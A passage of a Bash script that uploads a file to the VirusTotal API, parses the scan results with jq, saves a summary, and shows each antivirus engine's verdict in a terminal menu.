    FILETYPE=$(jq '.[] | .attributes.trid[]?.file_type' FILERESULTS.json | xargs)
    TYPEDESC=$(jq '.[] | .attributes.type_description' FILERESULTS.json | xargs)
    TYPETAG=$(jq '.[] | .attributes.type_tag' FILERESULTS.json | xargs)
    TYPETAGS=$(jq '.[] | .attributes.tags' FILERESULTS.json | xargs)
    FILEEXT=$(jq '.[] | .attributes.type_extension' FILERESULTS.json | xargs)
    MAGIC=$(jq '.[] | .attributes.magic' FILERESULTS.json | xargs)
    SHA256=$(jq '.[] | .attributes.sha256' FILERESULTS.json | xargs)
    SHA1=$(jq '.[] | .attributes.sha1' FILERESULTS.json | xargs)
    MD5HASH=$(jq '.[] | .attributes.md5' FILERESULTS.json | xargs)
    LINK=$(jq '.[] | .id' FILERESULTS.json | xargs)
    
    COUNTRESULTUND=$(jq '.[] | .attributes.last_analysis_stats.undetected' FILERESULTS.json | xargs)
    COUNTRESULTDET=$(jq '.[] | .attributes.last_analysis_stats.malicious' FILERESULTS.json | xargs)
    COUNTRESULTHAR=$(jq '.[] | .attributes.last_analysis_stats.harmless' FILERESULTS.json | xargs)
    COUNTRESULTUNS=$(jq '.[] | .attributes.last_analysis_stats."type-unsupported"' FILERESULTS.json | xargs)
    COUNTRESULTSUS=$(jq '.[] | .attributes.last_analysis_stats.suspicious' FILERESULTS.json | xargs)
    COUNTRESULTFAI=$(jq '.[] | .attributes.last_analysis_stats.failure' FILERESULTS.json | xargs)

    if [[ ${COUNTRESULTUND} -gt ${COUNTRESULTDET} ]];then
    GENRE="NO VIRUS DETECTED"
    fi

    if [[ ${COUNTRESULTDET} -gt "1" ]];then
    GENRE="VIRUS DETECTED"
    fi
    
    if [[ ${COUNTRESULTUND} == "0" && ${COUNTRESULTDET} == "0" ]];then
    GENRE="NEUTRAL"
    fi
    
    save="
    [* VIRUS SCAN FILE *]
    [*] RESULTS
    ----------------------------------------------------------
    [*] General Result: ${GENRE}
    [*] AV No Detected: ${COUNTRESULTUND}
    [*] AV Detected: ${COUNTRESULTDET}
    [*] AV Harmless: ${COUNTRESULTHAR}
    [*] AV Unsupported: ${COUNTRESULTUNS}
    [*] AV Suspicious: ${COUNTRESULTSUS}
    [*] AV Failure: ${COUNTRESULTFAI}
    ----------------------------------------------------------
    [*] File Name: ${NAMEFILE}
    [*] Names: ${NAMES}
    [*] Name Mean: ${NAMEMEAN}
    [*] Size: ${SIZE}
    [*] File Type: ${FILETYPE}
    [*] Type Description: ${TYPEDESC}
    [*] Type Tag: ${TYPETAG}
    [*] Type Tags: ${TYPETAGS}
    [*] Type Extension: ${FILEEXT}
    [*] Magic: ${MAGIC}
    [*] SHA-256: ${SHA256}
    [*] SHA-1: ${SHA1}
    [*] MD5 HASH: ${MD5HASH}
    [*] Link: https://www.virustotal.com/gui/file/${LINK}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"

    virus_scan_file_result
}

virus_scan_file_upload_large(){
    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Uploading File...}${reset} ${virus_scan_file_dir}"
    URLVT=$(curl -s --request GET --url "https://www.virustotal.com/api/v3/files/upload_url" --header "x-apikey: ${API_KEY_VT}" | jq -r .data)
    sleep 1
    UPLOAD_VT=$(curl -s --request POST --url ${URLVT} --header 'Content-Type: multipart/form-data' --header "x-apikey: ${API_KEY_VT}" --form file=@${virus_scan_file_dir} --progress-bar)

    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Analyzing File... 120 Seconds.${reset}"
    ANALYZE_VT=$(curl -s --request POST --url https://www.virustotal.com/api/v3/files/${MD5_VT}/analyse --header "x-apikey: ${API_KEY_VT}" --progress-bar)
    sleep 120

    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] File Analyzed.${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Searching Results... 5 Seconds.${reset}"
    sleep 5

    cd ${script_dir}/.files || exit_script
    RESULTS_VT=$(curl -s --request GET --url https://www.virustotal.com/api/v3/files/${MD5_VT} --header "x-apikey: ${API_KEY_VT}" > FILERESULTS.json)

    NAMEFILE=$(basename ${virus_scan_file_dir})
    NAMES=$(jq '.[] | .attributes.names[]' FILERESULTS.json | xargs)
    NAMEMEAN=$(jq '.[] | .attributes.meaningful_name' FILERESULTS.json | xargs)
    SIZEBYTES=$(jq '.[] | .attributes.size' FILERESULTS.json | xargs)
    SIZE=$(numfmt --to=iec --format "%10.2f" ${SIZEBYTES} | xargs)
    FILETYPE=$(jq '.[] | .attributes.trid[]?.file_type' FILERESULTS.json | xargs)
    TYPEDESC=$(jq '.[] | .attributes.type_description' FILERESULTS.json | xargs)
    TYPETAG=$(jq '.[] | .attributes.type_tag' FILERESULTS.json | xargs)
    TYPETAGS=$(jq '.[] | .attributes.tags' FILERESULTS.json | xargs)
    FILEEXT=$(jq '.[] | .attributes.type_extension' FILERESULTS.json | xargs)
    MAGIC=$(jq '.[] | .attributes.magic' FILERESULTS.json | xargs)
    SHA256=$(jq '.[] | .attributes.sha256' FILERESULTS.json | xargs)
    SHA1=$(jq '.[] | .attributes.sha1' FILERESULTS.json | xargs)
    MD5HASH=$(jq '.[] | .attributes.md5' FILERESULTS.json | xargs)
    LINK=$(jq '.[] | .id' FILERESULTS.json | xargs)
    
    COUNTRESULTUND=$(jq '.[] | .attributes.last_analysis_stats.undetected' FILERESULTS.json | xargs)
    COUNTRESULTDET=$(jq '.[] | .attributes.last_analysis_stats.malicious' FILERESULTS.json | xargs)
    COUNTRESULTHAR=$(jq '.[] | .attributes.last_analysis_stats.harmless' FILERESULTS.json | xargs)
    COUNTRESULTUNS=$(jq '.[] | .attributes.last_analysis_stats."type-unsupported"' FILERESULTS.json | xargs)
    COUNTRESULTSUS=$(jq '.[] | .attributes.last_analysis_stats.suspicious' FILERESULTS.json | xargs)
    COUNTRESULTFAI=$(jq '.[] | .attributes.last_analysis_stats.failure' FILERESULTS.json | xargs)

    if [[ ${COUNTRESULTUND} -gt ${COUNTRESULTDET} ]];then
    GENRE="NO VIRUS DETECTED"
    fi

    if [[ ${COUNTRESULTDET} -gt "1" ]];then
    GENRE="VIRUS DETECTED"
    fi
    
    if [[ ${COUNTRESULTUND} == "0" && ${COUNTRESULTDET} == "0" ]];then
    GENRE="NEUTRAL"
    fi

    save="
    [* VIRUS SCAN FILE *]
    [*] RESULTS
    ----------------------------------------------------------
    [*] General Result: ${GENRE}
    [*] AV No Detected: ${COUNTRESULTUND}
    [*] AV Detected: ${COUNTRESULTDET}
    [*] AV Harmless: ${COUNTRESULTHAR}
    [*] AV Unsupported: ${COUNTRESULTUNS}
    [*] AV Suspicious: ${COUNTRESULTSUS}
    [*] AV Failure: ${COUNTRESULTFAI}
    ----------------------------------------------------------
    [*] File Name: ${NAMEFILE}
    [*] Names: ${NAMES}
    [*] Name Mean: ${NAMEMEAN}
    [*] Size: ${SIZE}
    [*] File Type: ${FILETYPE}
    [*] Type Description: ${TYPEDESC}
    [*] Type Tag: ${TYPETAG}
    [*] Type Tags: ${TYPETAGS}
    [*] Type Extension: ${FILEEXT}
    [*] Magic: ${MAGIC}
    [*] SHA-256: ${SHA256}
    [*] SHA-1: ${SHA1}
    [*] MD5 HASH: ${MD5HASH}
    [*] Link: https://www.virustotal.com/gui/file/${LINK}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"

    virus_scan_file_result
}

virus_scan_file_result(){
    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] RESULTS SAVED IN ${reset}DATA/INFORMATION"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] General Result --> ${reset}${GENRE}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV No Detected --> ${reset}${COUNTRESULTUND}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Detected --> ${reset}${COUNTRESULTDET}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Harmless --> ${reset}${COUNTRESULTHAR}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Unsupported --> ${reset}${COUNTRESULTUNS}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Suspicious --> ${reset}${COUNTRESULTSUS}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] AV Failure --> ${reset}${COUNTRESULTFAI}${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] File Name --> ${reset}${NAMEFILE}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Names --> ${reset}${NAMES}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Name Mean --> ${reset}${NAMEMEAN}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Size --> ${reset}${SIZE}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] File Type --> ${reset}${FILETYPE}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Type Description --> ${reset}${TYPEDESC}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Type Tag --> ${reset}${TYPETAG}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Type Tags --> ${reset}${TYPETAGS}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Type Extension --> ${reset}${FILEEXT}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Magic --> ${reset}${MAGIC}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] SHA-256 --> ${reset}${SHA256}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] SHA-1 --> ${reset}${SHA1}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] MD5 HASH --> ${reset}${MD5HASH}${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link --> ${reset}https://www.virustotal.com/gui/file/${LINK}${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] VIEW${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' virus_scan_file_result
    if [[ ${virus_scan_file_result} == "01" ]] || [[ ${virus_scan_file_result} == "1" ]];then
    virus_scan_file_result_view
    elif [[ ${virus_scan_file_result} == "00" ]] || [[ ${virus_scan_file_result} == "0" ]];then
    rm -rf ${script_dir}/.files/FILERESULTS.json
    main_menu
    fi
}

virus_scan_file_result_view(){
    ACRONIS_Category=$(jq '.[] | .attributes.last_analysis_results."Acronis".category' FILERESULTS.json | xargs) 
    if [[ ${ACRONIS_Category} == *"undetected"* ]];then
    ACRONIS_Category="No Virus Detected."
    elif [[ ${ACRONIS_Category} == *"null"* ]];then
    ACRONIS_Category="Null"
    elif [[ ${ACRONIS_Category} == *"type-unsupported"* ]];then
    ACRONIS_Category="Unsupported"
    elif [[ ${ACRONIS_Category} == *"malicious"* ]];then
    ACRONIS_Category="Malicious!"
    elif [[ ${ACRONIS_Category} == *"failure"* ]];then
    ACRONIS_Category="ERROR!"
    elif [[ -z ${ACRONIS_Category} ]];then
    ACRONIS_Category="ERROR!"
    fi

    ACRONIS_Result=$(jq '.[] | .attributes.last_analysis_results."Acronis".result' FILERESULTS.json | xargs)
    if [[ ${ACRONIS_Result} == *"null"* ]];then
    ACRONIS_Result="Null"
    elif [[ -z ${ACRONIS_Result} ]];then
    ACRONIS_Result="ERROR!"
    fi



    ALIBABA_Category=$(jq '.[] | .attributes.last_analysis_results."Alibaba".category' FILERESULTS.json | xargs) 
    if [[ ${ALIBABA_Category} == *"undetected"* ]];then
    ALIBABA_Category="No Virus Detected."
    elif [[ ${ALIBABA_Category} == *"null"* ]];then
    ALIBABA_Category="Null"
    elif [[ ${ALIBABA_Category} == *"type-unsupported"* ]];then
    ALIBABA_Category="Unsupported"
    elif [[ ${ALIBABA_Category} == *"malicious"* ]];then
    ALIBABA_Category="Malicious!"
    elif [[ ${ALIBABA_Category} == *"failure"* ]];then
    ALIBABA_Category="ERROR!"
    elif [[ -z ${ALIBABA_Category} ]];then
    ALIBABA_Category="ERROR!"
    fi

    ALIBABA_Result=$(jq '.[] | .attributes.last_analysis_results."Alibaba".result' FILERESULTS.json | xargs)
    if [[ ${ALIBABA_Result} == *"null"* ]];then
    ALIBABA_Result="Null"
    elif [[ -z ${ALIBABA_Result} ]];then
    ALIBABA_Result="ERROR!"
    fi



    AD_AWARE_Category=$(jq '.[] | .attributes.last_analysis_results."Ad-Aware".category' FILERESULTS.json | xargs) 
    if [[ ${AD_AWARE_Category} == *"undetected"* ]];then
    AD_AWARE_Category="No Virus Detected."
    elif [[ ${AD_AWARE_Category} == *"null"* ]];then
    AD_AWARE_Category="Null"
    elif [[ ${AD_AWARE_Category} == *"type-unsupported"* ]];then
    AD_AWARE_Category="Unsupported"
    elif [[ ${AD_AWARE_Category} == *"malicious"* ]];then
    AD_AWARE_Category="Malicious!"
    elif [[ ${AD_AWARE_Category} == *"failure"* ]];then
    AD_AWARE_Category="ERROR!"
    elif [[ -z ${AD_AWARE_Category} ]];then
    AD_AWARE_Category="ERROR!"
    fi

    AD_AWARE_Result=$(jq '.[] | .attributes.last_analysis_results."Ad-Aware.result"' FILERESULTS.json | xargs)
    if [[ ${AD_AWARE_Result} == *"null"* ]];then
    AD_AWARE_Result="Null"
    elif [[ -z ${AD_AWARE_Result} ]];then
    AD_AWARE_Result="ERROR!"
    fi



    AHNLAB_Category=$(jq '.[] | .attributes.last_analysis_results."AhnLab-V3".category' FILERESULTS.json | xargs) 
    if [[ ${AHNLAB_Category} == *"undetected"* ]];then
    AHNLAB_Category="No Virus Detected."
    elif [[ ${AHNLAB_Category} == *"null"* ]];then
    AHNLAB_Category="Null"
    elif [[ ${AHNLAB_Category} == *"type-unsupported"* ]];then
    AHNLAB_Category="Unsupported"
    elif [[ ${AHNLAB_Category} == *"malicious"* ]];then
    AHNLAB_Category="Malicious!"
    elif [[ ${AHNLAB_Category} == *"failure"* ]];then
    AHNLAB_Category="ERROR!"
    elif [[ -z ${AHNLAB_Category} ]];then
    AHNLAB_Category="ERROR!"
    fi

    AHNLAB_Result=$(jq '.[] | .attributes.last_analysis_results."AhnLab-V3".result' FILERESULTS.json | xargs)
    if [[ ${AHNLAB_Result} == *"null"* ]];then
    AHNLAB_Result="Null"
    elif [[ -z ${AHNLAB_Result} ]];then
    AHNLAB_Result="ERROR!"
    fi



    ALYAC_Category=$(jq '.[] | .attributes.last_analysis_results."ALYac".category' FILERESULTS.json | xargs) 
    if [[ ${ALYAC_Category} == *"undetected"* ]];then
    ALYAC_Category="No Virus Detected."
    elif [[ ${ALYAC_Category} == *"null"* ]];then
    ALYAC_Category="Null"
    elif [[ ${ALYAC_Category} == *"type-unsupported"* ]];then
    ALYAC_Category="Unsupported"
    elif [[ ${ALYAC_Category} == *"malicious"* ]];then
    ALYAC_Category="Malicious!"
    elif [[ ${ALYAC_Category} == *"failure"* ]];then
    ALYAC_Category="ERROR!"
    elif [[ -z ${ALYAC_Category} ]];then
    ALYAC_Category="ERROR!"
    fi

    ALYAC_Result=$(jq '.[] | .attributes.last_analysis_results."ALYac".result' FILERESULTS.json | xargs)
    if [[ ${ALYAC_Result} == *"null"* ]];then
    ALYAC_Result="Null"
    elif [[ -z ${ALYAC_Result} ]];then
    ALYAC_Result="ERROR!"
    fi



    ANTIY_AVL_Category=$(jq '.[] | .attributes.last_analysis_results."Antiy-AVL".category' FILERESULTS.json | xargs) 
    if [[ ${ANTIY_AVL_Category} == *"undetected"* ]];then
    ANTIY_AVL_Category="No Virus Detected."
    elif [[ ${ANTIY_AVL_Category} == *"null"* ]];then
    ANTIY_AVL_Category="Null"
    elif [[ ${ANTIY_AVL_Category} == *"type-unsupported"* ]];then
    ANTIY_AVL_Category="Unsupported"
    elif [[ ${ANTIY_AVL_Category} == *"malicious"* ]];then
    ANTIY_AVL_Category="Malicious!"
    elif [[ ${ANTIY_AVL_Category} == *"failure"* ]];then
    ANTIY_AVL_Category="ERROR!"
    elif [[ -z ${ANTIY_AVL_Category} ]];then
    ANTIY_AVL_Category="ERROR!"
    fi

    ANTIY_AVL_Result=$(jq '.[] | .attributes.last_analysis_results."Antiy-AVL".result' FILERESULTS.json | xargs)
    if [[ ${ANTIY_AVL_Result} == *"null"* ]];then
    ANTIY_AVL_Result="Null"
    elif [[ -z ${ANTIY_AVL_Result} ]];then
    ANTIY_AVL_Result="ERROR!"
    fi



    ARCABIT_Category=$(jq '.[] | .attributes.last_analysis_results."Arcabit".category' FILERESULTS.json | xargs) 
    if [[ ${ARCABIT_Category} == *"undetected"* ]];then
    ARCABIT_Category="No Virus Detected."
    elif [[ ${ARCABIT_Category} == *"null"* ]];then
    ARCABIT_Category="Null"
    elif [[ ${ARCABIT_Category} == *"type-unsupported"* ]];then
    ARCABIT_Category="Unsupported"
    elif [[ ${ARCABIT_Category} == *"malicious"* ]];then
    ARCABIT_Category="Malicious!"
    elif [[ ${ARCABIT_Category} == *"failure"* ]];then
    ARCABIT_Category="ERROR!"
    elif [[ -z ${ARCABIT_Category} ]];then
    ARCABIT_Category="ERROR!"
    fi

    ARCABIT_Result=$(jq '.[] | .attributes.last_analysis_results."Arcabit".result' FILERESULTS.json | xargs)
    if [[ ${ARCABIT_Result} == *"null"* ]];then
    ARCABIT_Result="Null"
    elif [[ -z ${ARCABIT_Result} ]];then
    ARCABIT_Result="ERROR!"
    fi



    AVAST_Category=$(jq '.[] | .attributes.last_analysis_results."Avast".category' FILERESULTS.json | xargs) 
    if [[ ${AVAST_Category} == *"undetected"* ]];then
    AVAST_Category="No Virus Detected."
    elif [[ ${AVAST_Category} == *"null"* ]];then
    AVAST_Category="Null"
    elif [[ ${AVAST_Category} == *"type-unsupported"* ]];then
    AVAST_Category="Unsupported"
    elif [[ ${AVAST_Category} == *"malicious"* ]];then
    AVAST_Category="Malicious!"
    elif [[ ${AVAST_Category} == *"failure"* ]];then
    AVAST_Category="ERROR!"
    elif [[ -z ${AVAST_Category} ]];then
    AVAST_Category="ERROR!"
    fi

    AVAST_Result=$(jq '.[] | .attributes.last_analysis_results."Avast".result' FILERESULTS.json | xargs)
    if [[ ${AVAST_Result} == *"null"* ]];then
    AVAST_Result="Null"
    elif [[ -z ${AVAST_Result} ]];then
    AVAST_Result="ERROR!"
    fi



    AVASTMOBILE_Category=$(jq '.[] | .attributes.last_analysis_results."Avast-Mobile".category' FILERESULTS.json | xargs) 
    if [[ ${AVASTMOBILE_Category} == *"undetected"* ]];then
    AVASTMOBILE_Category="No Virus Detected."
    elif [[ ${AVASTMOBILE_Category} == *"null"* ]];then
    AVASTMOBILE_Category="Null"
    elif [[ ${AVASTMOBILE_Category} == *"type-unsupported"* ]];then
    AVASTMOBILE_Category="Unsupported"
    elif [[ ${AVASTMOBILE_Category} == *"malicious"* ]];then
    AVASTMOBILE_Category="Malicious!"
    elif [[ ${AVASTMOBILE_Category} == *"failure"* ]];then
    AVASTMOBILE_Category="ERROR!"
    elif [[ -z ${AVASTMOBILE_Category} ]];then
    AVASTMOBILE_Category="ERROR!"
    fi

    AVASTMOBILE_Result=$(jq '.[] | .attributes.last_analysis_results."Avast-Mobile".result' FILERESULTS.json | xargs)
    if [[ ${AVASTMOBILE_Result} == *"null"* ]];then
    AVASTMOBILE_Result="Null"
    elif [[ -z ${AVASTMOBILE_Result} ]];then
    AVASTMOBILE_Result="ERROR!"
    fi



    AVIRA_Category=$(jq '.[] | .attributes.last_analysis_results."Avira".category' FILERESULTS.json | xargs) 
    if [[ ${AVIRA_Category} == *"undetected"* ]];then
    AVIRA_Category="No Virus Detected."
    elif [[ ${AVIRA_Category} == *"null"* ]];then
    AVIRA_Category="Null"
    elif [[ ${AVIRA_Category} == *"type-unsupported"* ]];then
    AVIRA_Category="Unsupported"
    elif [[ ${AVIRA_Category} == *"malicious"* ]];then
    AVIRA_Category="Malicious!"
    elif [[ ${AVIRA_Category} == *"failure"* ]];then
    AVIRA_Category="ERROR!"
    elif [[ -z ${AVIRA_Category} ]];then
    AVIRA_Category="ERROR!"
    fi

    AVIRA_Result=$(jq '.[] | .attributes.last_analysis_results."Avira".result' FILERESULTS.json | xargs)
    if [[ ${AVIRA_Result} == *"null"* ]];then
    AVIRA_Result="Null"
    elif [[ -z ${AVIRA_Result} ]];then
    AVIRA_Result="ERROR!"
    fi



    BAIDU_Category=$(jq '.[] | .attributes.last_analysis_results."Baidu".category' FILERESULTS.json | xargs) 
    if [[ ${BAIDU_Category} == *"undetected"* ]];then
    BAIDU_Category="No Virus Detected."
    elif [[ ${BAIDU_Category} == *"null"* ]];then
    BAIDU_Category="Null"
    elif [[ ${BAIDU_Category} == *"type-unsupported"* ]];then
    BAIDU_Category="Unsupported"
    elif [[ ${BAIDU_Category} == *"malicious"* ]];then
    BAIDU_Category="Malicious!"
    elif [[ ${BAIDU_Category} == *"failure"* ]];then
    BAIDU_Category="ERROR!"
    elif [[ -z ${BAIDU_Category} ]];then
    BAIDU_Category="ERROR!"
    fi

    BAIDU_Result=$(jq '.[] | .attributes.last_analysis_results."Baidu".result' FILERESULTS.json | xargs)
    if [[ ${BAIDU_Result} == *"null"* ]];then
    BAIDU_Result="Null"
    elif [[ -z ${BAIDU_Result} ]];then
    BAIDU_Result="ERROR!"
    fi



    BITDEFENDER_Category=$(jq '.[] | .attributes.last_analysis_results."BitDefender".category' FILERESULTS.json | xargs) 
    if [[ ${BITDEFENDER_Category} == *"undetected"* ]];then
    BITDEFENDER_Category="No Virus Detected."
    elif [[ ${BITDEFENDER_Category} == *"null"* ]];then
    BITDEFENDER_Category="Null"
    elif [[ ${BITDEFENDER_Category} == *"type-unsupported"* ]];then
    BITDEFENDER_Category="Unsupported"
    elif [[ ${BITDEFENDER_Category} == *"malicious"* ]];then
    BITDEFENDER_Category="Malicious!"
    elif [[ ${BITDEFENDER_Category} == *"failure"* ]];then
    BITDEFENDER_Category="ERROR!"
    elif [[ -z ${BITDEFENDER_Category} ]];then
    BITDEFENDER_Category="ERROR!"
    fi

    BITDEFENDER_Result=$(jq '.[] | .attributes.last_analysis_results."BitDefender".result' FILERESULTS.json | xargs)
    if [[ ${BITDEFENDER_Result} == *"null"* ]];then
    BITDEFENDER_Result="Null"
    elif [[ -z ${BITDEFENDER_Result} ]];then
    BITDEFENDER_Result="ERROR!"
    fi



    BITDEFENDERFALX_Category=$(jq '.[] | .attributes.last_analysis_results."BitDefenderFalx".category' FILERESULTS.json | xargs) 
    if [[ ${BITDEFENDERFALX_Category} == *"undetected"* ]];then
    BITDEFENDERFALX_Category="No Virus Detected."
    elif [[ ${BITDEFENDERFALX_Category} == *"null"* ]];then
    BITDEFENDERFALX_Category="Null"
    elif [[ ${BITDEFENDERFALX_Category} == *"type-unsupported"* ]];then
    BITDEFENDERFALX_Category="Unsupported"
    elif [[ ${BITDEFENDERFALX_Category} == *"malicious"* ]];then
    BITDEFENDERFALX_Category="Malicious!"
    elif [[ ${BITDEFENDERFALX_Category} == *"failure"* ]];then
    BITDEFENDERFALX_Category="ERROR!"
    elif [[ -z ${BITDEFENDERFALX_Category} ]];then
    BITDEFENDERFALX_Category="ERROR!"
    fi

    BITDEFENDERFALX_Result=$(jq '.[] | .attributes.last_analysis_results."BitDefenderFalx".result' FILERESULTS.json | xargs)
    if [[ ${BITDEFENDERFALX_Result} == *"null"* ]];then
    BITDEFENDERFALX_Result="Null"
    elif [[ -z ${BITDEFENDERFALX_Result} ]];then
    BITDEFENDERFALX_Result="ERROR!"
    fi



    BITDEFENDERTHETA_Category=$(jq '.[] | .attributes.last_analysis_results."BitDefenderTheta".category' FILERESULTS.json | xargs) 
    if [[ ${BITDEFENDERTHETA_Category} == *"undetected"* ]];then
    BITDEFENDERTHETA_Category="No Virus Detected."
    elif [[ ${BITDEFENDERTHETA_Category} == *"null"* ]];then
    BITDEFENDERTHETA_Category="Null"
    elif [[ ${BITDEFENDERTHETA_Category} == *"type-unsupported"* ]];then
    BITDEFENDERTHETA_Category="Unsupported"
    elif [[ ${BITDEFENDERTHETA_Category} == *"malicious"* ]];then
    BITDEFENDERTHETA_Category="Malicious!"
    elif [[ ${BITDEFENDERTHETA_Category} == *"failure"* ]];then
    BITDEFENDERTHETA_Category="ERROR!"
    elif [[ -z ${BITDEFENDERTHETA_Category} ]];then
    BITDEFENDERTHETA_Category="ERROR!"
    fi

    BITDEFENDERTHETA_Result=$(jq '.[] | .attributes.last_analysis_results."BitDefenderTheta".result' FILERESULTS.json | xargs)
    if [[ ${BITDEFENDERTHETA_Result} == *"null"* ]];then
    BITDEFENDERTHETA_Result="Null"
    elif [[ -z ${BITDEFENDERTHETA_Result} ]];then
    BITDEFENDERTHETA_Result="ERROR!"
    fi



    BKAV_Category=$(jq '.[] | .attributes.last_analysis_results."Bkav".category' FILERESULTS.json | xargs) 
    if [[ ${BKAV_Category} == *"undetected"* ]];then
    BKAV_Category="No Virus Detected."
    elif [[ ${BKAV_Category} == *"null"* ]];then
    BKAV_Category="Null"
    elif [[ ${BKAV_Category} == *"type-unsupported"* ]];then
    BKAV_Category="Unsupported"
    elif [[ ${BKAV_Category} == *"malicious"* ]];then
    BKAV_Category="Malicious!"
    elif [[ ${BKAV_Category} == *"failure"* ]];then
    BKAV_Category="ERROR!"
    elif [[ -z ${BKAV_Category} ]];then
    BKAV_Category="ERROR!"
    fi

    BKAV_Result=$(jq '.[] | .attributes.last_analysis_results."Bkav".result' FILERESULTS.json | xargs)
    if [[ ${BKAV_Result} == *"null"* ]];then
    BKAV_Result="Null"
    elif [[ -z ${BKAV_Result} ]];then
    BKAV_Result="ERROR!"
    fi



    CATQUICKHEAL_Category=$(jq '.[] | .attributes.last_analysis_results."CAT-QuickHeal".category' FILERESULTS.json | xargs) 
    if [[ ${CATQUICKHEAL_Category} == *"undetected"* ]];then
    CATQUICKHEAL_Category="No Virus Detected."
    elif [[ ${CATQUICKHEAL_Category} == *"null"* ]];then
    CATQUICKHEAL_Category="Null"
    elif [[ ${CATQUICKHEAL_Category} == *"type-unsupported"* ]];then
    CATQUICKHEAL_Category="Unsupported"
    elif [[ ${CATQUICKHEAL_Category} == *"malicious"* ]];then
    CATQUICKHEAL_Category="Malicious!"
    elif [[ ${CATQUICKHEAL_Category} == *"failure"* ]];then
    CATQUICKHEAL_Category="ERROR!"
    elif [[ -z ${CATQUICKHEAL_Category} ]];then
    CATQUICKHEAL_Category="ERROR!"
    fi

    CATQUICKHEAL_Result=$(jq '.[] | .attributes.last_analysis_results."CAT-QuickHeal".result' FILERESULTS.json | xargs)
    if [[ ${CATQUICKHEAL_Result} == *"null"* ]];then
    CATQUICKHEAL_Result="Null"
    elif [[ -z ${CATQUICKHEAL_Result} ]];then
    CATQUICKHEAL_Result="ERROR!"
    fi



    CROWDSTRIKE_Category=$(jq '.[] | .attributes.last_analysis_results."CrowdStrike".category' FILERESULTS.json | xargs) 
    if [[ ${CROWDSTRIKE_Category} == *"undetected"* ]];then
    CROWDSTRIKE_Category="No Virus Detected."
    elif [[ ${CROWDSTRIKE_Category} == *"null"* ]];then
    CROWDSTRIKE_Category="Null"
    elif [[ ${CROWDSTRIKE_Category} == *"type-unsupported"* ]];then
    CROWDSTRIKE_Category="Unsupported"
    elif [[ ${CROWDSTRIKE_Category} == *"malicious"* ]];then
    CROWDSTRIKE_Category="Malicious!"
    elif [[ ${CROWDSTRIKE_Category} == *"failure"* ]];then
    CROWDSTRIKE_Category="ERROR!"
    elif [[ -z ${CROWDSTRIKE_Category} ]];then
    CROWDSTRIKE_Category="ERROR!"
    fi

    CROWDSTRIKE_Result=$(jq '.[] | .attributes.last_analysis_results."CrowdStrike".result' FILERESULTS.json | xargs)
    if [[ ${CROWDSTRIKE_Result} == *"null"* ]];then
    CROWDSTRIKE_Result="Null"
    elif [[ -z ${CROWDSTRIKE_Result} ]];then
    CROWDSTRIKE_Result="ERROR!"
    fi



    CLAMAV_Category=$(jq '.[] | .attributes.last_analysis_results."ClamAV".category' FILERESULTS.json | xargs) 
    if [[ ${CLAMAV_Category} == *"undetected"* ]];then
    CLAMAV_Category="No Virus Detected."
    elif [[ ${CLAMAV_Category} == *"null"* ]];then
    CLAMAV_Category="Null"
    elif [[ ${CLAMAV_Category} == *"type-unsupported"* ]];then
    CLAMAV_Category="Unsupported"
    elif [[ ${CLAMAV_Category} == *"malicious"* ]];then
    CLAMAV_Category="Malicious!"
    elif [[ ${CLAMAV_Category} == *"failure"* ]];then
    CLAMAV_Category="ERROR!"
    elif [[ -z ${CLAMAV_Category} ]];then
    CLAMAV_Category="ERROR!"
    fi

    CLAMAV_Result=$(jq '.[] | .attributes.last_analysis_results."ClamAV".result' FILERESULTS.json | xargs)
    if [[ ${CLAMAV_Result} == *"null"* ]];then
    CLAMAV_Result="Null"
    elif [[ -z ${CLAMAV_Result} ]];then
    CLAMAV_Result="ERROR!"
    fi



    CMC_Category=$(jq '.[] | .attributes.last_analysis_results."CMC".category' FILERESULTS.json | xargs) 
    if [[ ${CMC_Category} == *"undetected"* ]];then
    CMC_Category="No Virus Detected."
    elif [[ ${CMC_Category} == *"null"* ]];then
    CMC_Category="Null"
    elif [[ ${CMC_Category} == *"type-unsupported"* ]];then
    CMC_Category="Unsupported"
    elif [[ ${CMC_Category} == *"malicious"* ]];then
    CMC_Category="Malicious!"
    elif [[ ${CMC_Category} == *"failure"* ]];then
    CMC_Category="ERROR!"
    elif [[ -z ${CMC_Category} ]];then
    CMC_Category="ERROR!"
    fi

